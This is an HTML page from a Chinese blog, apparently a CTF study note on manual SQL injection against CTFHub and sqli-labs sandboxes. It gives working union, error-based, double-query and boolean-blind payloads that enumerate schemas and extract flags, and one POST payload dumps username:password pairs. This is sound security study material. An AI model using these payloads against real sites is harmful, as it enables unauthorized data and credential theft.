@@ -1,0 +1,2036 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Sql注入, 0xahh的博客">
+    <meta name="description" content="技术">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Sql注入 | 0xahh的博客</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">0xahh的博客</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">0xahh的博客</div>
+        <div class="logo-desc">
+            
+            技术
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/howahh" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>github
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/howahh" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="github" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Sql注入</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">web安全</span>
+                            </a>
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                web安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-09-22
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2021-08-06
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    11k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    43 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>sql注入是一种在ctf中比较常见的题型，在曾经的大家并没有注重安全的年代很多网站都有sql注入的漏洞，当然随着技术的发展，存在sql注入的网站越来越少，但其依旧是web安全中一大威胁，且一些题目中会包含相关步骤，需要了解掌握，以下主要记录各种手动注入的步骤</p>
+<p><strong><em>没有图片，还没解决图片上传的问题，就这样吧，下一篇再解决</em></strong> </p>
+<p>对于sql注入来说，我们一般会按照以下步骤</p>
+<ol>
+<li>判断是否存在注入（是否严格校验）<ol>
+<li>可控参数改变是否影响页面</li>
+<li>输入的sql语句是否能引发报错—通过报错可以看到数据库的一些语句痕迹**(比如使用单引号，双引号，小括号等，以及其组合，是sql语句闭合，导致原来的闭合语句后半部分报错，需要经验的积累)**</li>
+<li>能否消除报错（闭合）</li>
+</ol>
+</li>
+<li>判断注入类型</li>
+<li>判断语句是否能被恶意修改</li>
+<li>是否能够成功执行</li>
+<li>获取想要的数据<ol>
+<li>数据库-》表-》字段-》值<ol>
+<li>当我们使用mysql时可以注意到，不止一个库，而其中的<strong>infomation_schema</strong> 库储存着<strong>所有库中的表</strong>的有关信息</li>
+<li>information_schema中有三个表储存着我们想要的信息<ol>
+<li>schemata表，该表中的<strong>schema_name</strong>字段包含了所有<strong>数据库的name信息</strong>，其它字段不做考虑，分别是编码和sql_path等，通过<strong>schema_name</strong>列来进行数据库的查询</li>
+<li>tables表，该表中的<strong>table_name</strong>字段包含了所有的库中所有的表的名称，且其中的table_schema列包含了所有的库的名称（有重复，因为和后面的table_name)相对应</li>
+<li>columns表，该表中的<strong>column_name</strong>字段包含了所有库中所有表的所有<strong>字段名称</strong>，其中的table_schema列包含了所有的库的名称，table_name列包含了所有的库中所有的表的名称</li>
+</ol>
+</li>
+<li>在通过这三个表依次进行查询后可以知道哪个库有哪些表有哪些字段，这时候就可以按照我们所需来进行查询<em>为什么不直接用columns表呢，既然其中的列已经涵盖了库，表，列的信息？因为字段冗余，不便于我们对信息的查看，当然也可以通过sql语句的构造来解决这个问题，直接查询columns表或许是一个优越的选择</em></li>
+</ol>
+</li>
+<li>在能够获取数据后，通过构造sql语句来进行查询，比如flag或者admin的账号和密码等敏感信息，或者在之后植入后门等。</li>
+</ol>
+</li>
+</ol>
+<h3 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h3><p>对于整数型注入，我们以ctfhub上的第一题整数型注入来进行实验以及记录</p>
+<p>首先记录整数型注入的简单原理</p>
+<p>最基础，通过?id=1’来进行判断  当加了单引号’后出现报错，说明可能存在注入点，  原理：正常语句时这样的：select * from table where id=1   select * from table where id=1’无法识别引号，会引起报错，<del>这样就可以判断他是一个整数型注入的点</del>，其实这样字符型也会报错，但需要判断的话需要看报错出现的提示，需要加双引号或者其他的东西来继续看结果才能判断</p>
+<p>下面来进行注入，查找flag</p>
+<ol>
+<li><p>首先按照提示，输入一个参数：1，可以看到查询结果ID为1和data，此时的url为：</p>
+<p><code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=1</code></p>
+</li>
+<li><p>加单引号后查询失败，可以看到一个sql语句：<code>select * from news where id=1&#39;</code>,说明有注入点，我们再加入#注释符可以成功执行，<strong>说明是一个整数型注入</strong>现在开始注入</p>
+</li>
+<li><p>首先要判断此时的表中有多少列的数据，可以使用order by或者union select</p>
+<ol>
+<li>order by 1如果成功说明一列，order by 2成功为两列，以此类推，order by 是按照第几列来排序的，这里使用了他的特性如果该列不存在则报错的属性来判断有几列</li>
+<li>union select是联合查询，是将查询组合到一起的操作，在判断时union select 1,2,4 这是试3列是否正确，这里的数字是几不重要</li>
+</ol>
+<p>实验后发现，当语句为<code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=1 order by 2</code></p>
+<p>时有输出，说明有该表有两列，此时就可以使用union seclect了</p>
+</li>
+<li><p><code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=1 union select 1,user()</code></p>
+<p>此时我们想要的是简单查看一下user()但此时不会输出，因为显示的是id=1所查询到的，只要将id=1改为一个不可能查询到的数即可，比如-1，*若还不出则改变user()在union select中的位置，改变后查询成功</p>
+</li>
+<li><p>现在开始查询库，表，字段的信息：<code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=-1 union select 1,schema_name from information_schema.schemata</code></p>
+<p>可以查到一个库名，要想查看所有库怎么办？</p>
+<p>使用一个group_concat()这个函数的作用是将所有的子弹组合起来在一起输出，这里再记录一个concat_wx()函数，其作用是将不同子段组合在一起输出：concat_ws(‘:’,id,password)这里的意思是将id与password子段对应组合输出，二者中间以：分隔，再将这个函数放在group_concat()中，及可输出所有的对应id与password</p>
+<p><code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=-1 union select 1,group_concat(schema_name) from information_schema.schemata</code></p>
+<p>此时查询到Data: information_schema,performance_schema,mysql,sqli，说明有这几个库，接下来查表，我们来查sqli这个库中的表</p>
+<p><code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=-1 union select database(),group_concat(table_name) from information_schema.tables   where table_schema = &#39;sqli&#39;</code>(注意这里的table_schema=要加单引号，因为每加半天没出来)</p>
+<p>查询可以看到该库的表，其中发现了名为flag的表</p>
+<p>接下来就是查询字段了，我们来看flag这个表里有哪些字段<code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=-1 union select database(),group_concat(column_name) from information_schema.columns   where table_schema = &#39;sqli&#39; and table_name=&#39;flag&#39;</code></p>
+<p>可以看到有一个字段：flag</p>
+<p>此时我们已经完成了探索，只需要将需要的flag取出来即可：<code>http://challenge-d84b346a09f7aa3f.sandbox.ctfhub.com:10080/?id=-1 union select database(),flag from sqli.flag</code></p>
+<p>即从对应的库的对应表中取出数据：ctfhub{63dcb9358daa938b5fdb1c976c04ca8b8436d6c2}</p>
+<p>拿到了flag</p>
+</li>
+</ol>
+<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p><code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; and 1=0 union select 1,flag from sqli.flag --+</code></p>
+<p>这是最后的结果，作为参考</p>
+<p>当我们输入1后可以看到（这是靶场特地放出来的，一般情况下不会放出需要自己去判断是什么样的注入），比如整数型加单引号报错后简单的#就可以消除报错，但字符型不行，需要在后面加–+来将原来的单引号注释掉才能成功执行，这说明这是一个字符型注入</p>
+<p>select * from news where id=’1’，这就体现出是字符报错</p>
+<ol>
+<li><p>判断出是字符型后就加–+来消除报错，之前 的单引号已经使id=’1’闭合了，所以–+注释掉之前的单引号<code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39;  --+</code></p>
+<p>此时可看到执行成功，有输出，现在开始判断有多少列</p>
+</li>
+<li><p><code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39;  order by 2--+</code>可以看到有两列，</p>
+</li>
+<li><p><code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; union select 1,database()--+</code>此时输出发现有结果但不是我们想要的，因为输出的是通过id查到的东西，将其变为不可查到的东西，使用 and 1=0这样让id查找的值始终为false，就可以查找我们想要的了</p>
+<p><code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; and 1=0 union select 1,database()--+</code></p>
+<p>可以看到当前的database为sqli</p>
+</li>
+<li><p>现在开始查询库，表，列</p>
+<p><code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; and 1=0 union select 1,group_concat(schema_name) from information_schema.schemata --+</code> 可以看到查询到了几个库：Data: information_schema,performance_schema,mysql,sqli，下面来查sqli库中的表<code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; and 1=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;sqli&#39; --+</code></p>
+<p>可以看到有flag表和news表，我们来查flag表有哪些字段</p>
+<p><code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; and 1=0 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#39;sqli&#39; and table_name =&#39;flag&#39; --+</code></p>
+<p>发现有flag字段，查出来就可以了<code>http://challenge-e11462cf3fb823eb.sandbox.ctfhub.com:10080/?id=1&#39; and 1=0 union select 1,flag from sqli.flag--+</code></p>
+<p>字符型注入完成</p>
+</li>
+</ol>
+<h3 id="post型注入"><a href="#post型注入" class="headerlink" title="post型注入"></a>post型注入</h3><p>之前的都是get型注入，参数直接在url中就可以提现和更改，post型注入不同，其参数放在post表单里进行提交，一般来说登录框的提交就是post类型提交，原理还是一样的，检测是否能使其报错，报错后能否闭合，闭合后查去想要的数据，我们来具体过程如下，以sqli-labs中的第11题作为实验</p>
+<p>这里的</p>
+<ol>
+<li><p>在post注入中，可以使用hackbar的post提交表单来进行或者通过burp来抓包改包，这里使用hackbar来作为实验，首先需要看一下页面组成元素可以看到以下两个</p>
+<p>input type=”text” name=”uname” value=””</p>
+<p>input type=”text” name=”passwd” value=””</p>
+<p>可以看到两个框的输入，一个子段名为uname，一个为passwd，开始检查有无注入点：</p>
+</li>
+<li><p>使用hackbar的postdata，放入参数<code>uname=1&#39;&amp;passwd=1</code>，执行，可以看到报错，说明存在报错，简单说一下这里的语法，加入单引号，引起报错，因为使其不闭合</p>
+</li>
+<li><p>接下来要使其闭合，首先使用#<code>uname=1&#39; #&amp;passwd=1</code>,可以看到报错消失了，可以知道这是一个整型注入，我们知道要想登录成功需要为true所以我们使用<code>uname=1&#39; or 1 #&amp;passwd=1</code>，可以看到这时第一个uname处通过or已经成功为1了，此时已经可以登录成功了，接下来就开始查询想要的数据，去掉or 1 <code>uname=1&#39;  union select database(),1 #&amp;passwd=1</code>,就可以查到database()了,接下来就可以查询别的<code>uname=1&#39;  union select database(),group_concat(schema_name) from information_schema.schemata #&amp;passwd=1</code>,找到了有一个security库</p>
+</li>
+<li><p><code>uname=1&#39;  union select database(),group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; #&amp;passwd=1</code></p>
+<p>接下来就可以看到该表有哪些列了</p>
+<p><code>uname=1&#39;  union select database(),group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;#&amp;passwd=1</code></p>
+<p>接着查到有username和password列，接下来直接查想要的就好了</p>
+<p><code>uname=1&#39;  union select database(),group_concat(concat_ws(&#39;:&#39;,username,password)) from security.users #&amp;passwd=1</code></p>
+</li>
+</ol>
+<h3 id="双注入"><a href="#双注入" class="headerlink" title="双注入"></a>双注入</h3><ul>
+<li><p><strong>group by</strong> 语句时一个分组语句，将要选择的数据按照一个条件来进行分组，使其聚合在一起，</p>
+</li>
+<li><p>**concat()**函数用于将两个字符串连接为一个字符串,括号内CONCAT(‘FIRST ‘, ‘SECOND’)，这样输出时二者并在一起输出。</p>
+</li>
+</ul>
+<p>双注入时我们在使用之前的手段即使用union select后无法在页面显示我们想要的信息时，通过在我们想要的地方报错使用子select，将敏感信息报错出来，就是双注入</p>
+<p>双注入就是利用了group by和concat以及一个随机数<strong>floor(rand()*2)即0或1<strong>作为group by的条件，因为如果两次都取得了同一个值（如两次0）就会产生报错，这时候通过concat，将要查询的字段</strong>一个select语句，所以叫双注入**放在concat中，就在报错信息中被放出来了，这样就可以进行查询了，示例语句如下：<code>?id=1 union select 1,2 from infomation_schema group by concat(floor(rand() *2),(select table_name from infomation_shcema.tables))</code>**后续发现使用rand(0)*2更可控，</strong></p>
+<p>这里以ctfhub中的技能树中的报错注入来做一个讲解</p>
+<p><code>http://challenge-65678edc24f805b1.sandbox.ctfhub.com:10080/?id=1 union select 1,count(1) from information_schema.tables group by concat(floor(rand()*2),(select flag from flag))</code></p>
+<p>这里的union select直接使用时无法获得数据的，需要后续的报错来进行报错。</p>
+<p>但这里有一个问题，每一次的双注入报错，会不允许一次爆出多行数据，需要一行一行的找，需要在子select中使用 limit 0,1 limit 1,1一行一行的试，这里解出题是因为其库，表，字段的结构简单，但如果是一个未知的环境，会很难。</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>就是通过报错，将敏感信息爆出来，使用一些新的函数，可以使得报错注入更加简单，这里介绍三个函数来进行报错，</p>
+<ol>
+<li><strong>extractvalue()</strong>:从目标XML中返回包含所查询值的字符串，</li>
+<li>extractvalue(XML_document,XPath_string);<ol>
+<li>第一个参数，是string格式，为XML文档名称，</li>
+<li>第二个参数，XPath_string（XPath格式的字符串）</li>
+</ol>
+</li>
+<li>updatexml(XML_document,XPath_string,new_value)<ol>
+<li>第一个参数，是string格式，为XML文档名称，</li>
+<li>第二个参数，XPath_string（XPath格式的字符串）</li>
+<li>第三个参数，new_value，string格式，替换查找到的符合条件的数据</li>
+</ol>
+</li>
+<li>还有其他很多的报错注入函数：</li>
+</ol>
+<p><img src="/images/image-20210804160842031.png"></p>
+<p>但在这里我们并不正确的使用这些函数，而是让他们报错，在报错的地方来看到敏感信息，</p>
+<p>接下来来看这些语句的使用，还是以ctfhub的报错注入作为例子</p>
+<ul>
+<li>开始的判断报错不再展示，还是需要先判断有多少列，然后使用union select</li>
+</ul>
+<p><code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,(select version()))</code>这里使用extractvalue（），第一个参数随便写个1，重点就是第二个参数，正常时应该使用一个字符串，这里用他来报错，这里就可以查出其version了，但注意到，这时查出的语句为：XPATH syntax error: ‘.22-MariaDB-0+deb10u1’，报错正常，但可以看到显示不全，这时候我们就需要加入一个concat函数来拼接一下，拼接0x74即一个’~’号，就可以查到了所有的信息了，</p>
+<ul>
+<li><p><code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,(select version())))</code>这样就可以看到所有的信息了，现在就可以开始查想要的东西了，注意，<strong>可以group_concat()</strong><code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))</code></p>
+</li>
+<li><p>这样可以看到本库里的表，看到有一个flag表，查这个表，<code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#39;flag&#39; limit 0,1)))</code>看到只有一个flag字段，那就只有这里了，查出来就行了，<code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,(select flag from flag)))</code></p>
+</li>
+<li><p>但我们发现这时候的flag不全，只有一部分，这是因为用xpath报错值显示32位，这时候就需要使用一个函数，叫做<strong>mid()</strong>,</p>
+</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">mid(str,start,[length])  str:截取的字符串  start:起始位置  length:截取的长度，可以忽略<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>将子select当做str参数，start从32开始，就可以取到flag后半部分了<code>http://challenge-fbd23468e7d17f1b.sandbox.ctfhub.com:10080/?id=1 union select 1,extractvalue(1,concat(0x7e,mid((select flag from flag),32)))</code></p>
+<ul>
+<li>我们也可以使用updatexml()函数，区别只是最后多一个参数，那个参数写1就行了</li>
+</ul>
+<p><strong>之前不知道怎么的，记录到时不能使用group_concat(),但其实是可以的</strong>，记录一下使用的详情，以sqlilab为例：</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;))) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>可以得到：</p>
+<p><img src="/images/image-20210722162921128.png"></p>
+<p>报错注入差不多就这样了</p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>什么是盲注，盲注就是在即使页面正常运行时也不会在页面上显示出数据，即使注入成功无法直接的查询到想要的数据，只能通过true or false来判断查询的单一字符是否正确。我们会通过该ascii码表来对需要的数据进行一一比对，在比对为真时就可以知道这一位的数据是我们想要的了。</p>
+<p>我们在判断时会通过真假来，这时我们需要在确认了有注入点以及判断了是哪种类型的注入后，在为假的条件后（比如?id=1为真，?id=1’）使用 or 语句的后续语句真与否来判断。后续语句就是我们想要知道的信息了，写一条语句作为分析</p>
+<ul>
+<li>ascii()是将其中的字符转换为ascii对应的数字，如“A”会转换为65，这样方便比对，</li>
+<li>substr(strings|express,m,[n])用于语句截断，<ul>
+<li>第一个参数是要被截断的字符串，</li>
+<li>第二个是开始截断的位数，</li>
+<li>第三个是偏移量，即一次截断多少位</li>
+</ul>
+</li>
+<li>除了substr()也有别的用于截断的函数，比如left(),right(),mid()+ord(),regexp(),也可能用到like()，可以灵活运用</li>
+</ul>
+<p><code>?id=1&#39; or (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema = database() limit0,1)=100#</code></p>
+<p>对语句做分析，在判断注入了以后使用#来消除报错，然后使用or语句，来进行布尔判断，括号内，可以看出我们现在在查的是当前数据库下的第一个表的名（通过limit)，而substr在判断这第一个表的名的第一个字母是否为ascii值为100的字符，如果是，则会显示true，这时我们就知道了第一个字符，然后依次试验下去，就知道了整个表名（是很繁琐以及不切实际，但原理确实是这样的，可以使用burp等自动化工具来爆破或者直接sqlmap，这里只是讲解原理）</p>
+<p>下面通过ctfhub的布尔盲注来进行讲解</p>
+<p><code>http://challenge-23383a60e8712835.sandbox.ctfhub.com:10080/?id=1 and (select ascii(substr(flag,1,1)) from flag)=99</code></p>
